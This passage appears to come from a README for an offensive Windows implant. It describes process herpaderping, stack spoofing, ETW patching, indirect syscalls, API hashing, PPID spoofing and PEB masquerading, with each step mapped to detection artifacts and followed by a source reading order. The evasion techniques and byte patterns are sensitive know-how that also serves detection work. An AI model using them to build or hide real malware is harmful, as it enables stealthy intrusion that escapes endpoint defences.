| `NtCreateThreadEx` from caller process into ghost process | Cross-process thread creation — visible as remote thread injection (EventCode=8 signal) |
| Ghost process starts executing at `AddressOfEntryPoint` | Payload running; PPID shows `svchost`; on-disk image shows IIS log |

---

## Stack Spoofing Flow

`StackSpoofer` is used around **one** call: `NtCreateProcessEx`.

**Constructor (runs before `Activate`):**

1. `_AddressOfReturnAddress()` — intrinsic; captures `&returnAddress` on the current stack frame
2. `GetModuleHandleA(OBFSTR("kernel32.dll"))` — get kernel32 base
3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))` — get `SizeOfImage`
4. Scan full image bytes for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue)
5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to confirm `PAGE_EXECUTE_READ[WRITE]`
6. Store `fakeReturnAddress` = gadget VA inside kernel32 `.text`

**Activate / Deactivate:**

- `Activate()`: `*returnAddressLocation = fakeReturnAddress` — EDR stack walk during `NtCreateProcessEx` syscall sees call origin as `kernel32.dll`
- `Deactivate()`: `*returnAddressLocation = originalReturnAddress` — restored after syscall returns

| Call | Stack-spoofed? |
|---|---|
| `NtCreateSection` | No |
| `NtCreateProcessEx` | **Yes** |
| `NtAllocateVirtualMemory` | No |
| `NtWriteVirtualMemory` × 2 | No |
| `NtCreateThreadEx` | No |
| All `RESOLVE_API` calls | No |

---

## Detection-Relevant Code Paths

| Behavior | Code Path | Observable Artifact |
|---|---|---|
| ETW tampering (conditional) | `wmain()` → `PatchEtw()` (`#ifdef ENABLE_ETW_PATCH`) | `ntdll!EtwEventWrite` patched to `xor eax,eax; ret`; `VirtualProtect` on ntdll code page |
| Reflective payload load (Mode 1) | `GetPayloadBuffer()` stdin branch | `FILE_TYPE_PIPE` on stdin; payload never on disk; `ReadFile` from pipe |
| File-based payload load (Mode 2) | `GetPayloadBuffer()` file fallback | `PAYLOAD_PATH` opened, read, then `DeleteFileW`; brief existence |
| XOR decode (Mode 2, conditional) | `#ifdef ENABLE_PAYLOAD_XOR` in `GetPayloadBuffer()` | On-disk file first byte `0xEE`, not `MZ`; in-memory buffer valid PE after decode |
| Syscall stub pool | `InitSyscallPool` + `INDIRECT_SYSCALL` × 5 + `SealSyscallPool` | Anonymous `VirtualAlloc(PAGE_READWRITE)` → `VirtualProtect(PAGE_EXECUTE_READ)`; 21-byte stubs matching `49 89 CA B8 XX XX XX XX 49 BB ...` |
| Temp PE staging | `GetTempFileNameW` / `CreateFileW(FILE_ATTRIBUTE_HIDDEN)` / `WriteFile` / `FlushFileBuffers` | `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN`; handle held open; hidden from Explorer / basic `dir` — visible via `dir /ah` or Sysmon EID 11 |
| SEC_IMAGE section creation | `NtCreateSection(SEC_IMAGE, hTemp)` | Kernel `MmFlushImageSection` fires; file image-locked for new writers |
| PPID spoof candidate search | `GetNonJobParent()` | `CreateToolhelp32Snapshot` + `Process32First/Next` + `OpenProcess(PROCESS_CREATE_PROCESS)` on Session 0 process |
| StackSpoof gadget scan | `StackSpoofer` constructor | `GetModuleHandleA("kernel32.dll")` + `GetModuleInformation` + byte scan; `VirtualQuery` on fallback `ret` candidates |
| Ghost process creation | `NtCreateProcessEx(hSection, hParent, Flags=0)` | Process image from `HD*.tmp`; PPID = `svchost.exe` / `wininit.exe`; token = SYSTEM (from spoofed parent); no primary thread yet |
| Stack spoofing | `StackSpoofer::Activate/Deactivate` around `NtCreateProcessEx` | Return address in `kernel32.dll` during syscall (fake `add rsp,0x28; ret` epilogue) |
| File herpaderping overwrite | `SetFilePointer(0)` + `WriteFile` loop via pre-held `hTemp` | `HD*.tmp` overwritten in-place with IIS log content; `totalWritten` covers all `payloadSize` bytes |
| Temp file persistent on disk | `STATUS_CANNOT_DELETE` (active SEC_IMAGE blocks unlink) | `HD*.tmp` remains after ghost process exits — not deleted; content is IIS log |
| Entry point resolution | `NtQueryInformationProcess` + `NtReadVirtualMemory` + `RtlImageNtHeader` | PEB read cross-process; no `WriteProcessMemory` |
| PEB parameter injection | 64KB-aligned `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` × 2 | Remote allocation at specific hint VA; `PEB->ProcessParameters` patched; `ImagePathName` = `RuntimeBroker.exe` |
| Thread launch | `NtCreateThreadEx(hProcess, entryPoint)` | Cross-process thread creation into ghost process (EventCode=8 signal); no `ResumeThread` — direct launch |
| String obfuscation | `OBFSTR()` / `OBFWSTR()` | `svchost.exe`, `kernel32.dll`, `RuntimeBroker.exe`, `C:\Windows\System32` not present as plaintext in binary |
| API hash resolution | `GetNtdllBase()` PEB walk → `RESOLVE_API()` DJB2 EAT | ntdll APIs resolved by hash; no `GetProcAddress("ApiName")` call |
| Indirect syscall | `INDIRECT_SYSCALL` × 5 (Halo's Gate) | `syscall` instruction executes from ntdll gadget (`0F 05 C3`), not from stub page or PE |

---

## Reading Order

1. `CWLImplant.cpp`: read `wmain()`, `GetPayloadBuffer()`, then `Herpaderping()` in order.
2. `obfstr.h`: understand compile-time XOR string obfuscation.
3. `api_hash.h`: understand PEB walk for module base, DJB2 EAT hash resolution, and pre-computed hash constants.
4. `syscall.h`: understand Halo's Gate SSN resolution, `syscall;ret` gadget scan, and stub builder for the 5 injection-critical APIs.
5. `StackSpoof.cpp`: understand `GetModuleInformation`-based image scan, gadget pattern matching, and return-address slot manipulation.
6. `CWLInc.h`: consult NT structure typedefs (`RTL_USER_PROCESS_PARAMETERS`, `PEB`, `PROCESS_BASIC_INFORMATION`, `_NtCreateProcessEx`, `_NtCreateThreadEx`) when call signatures are unclear.
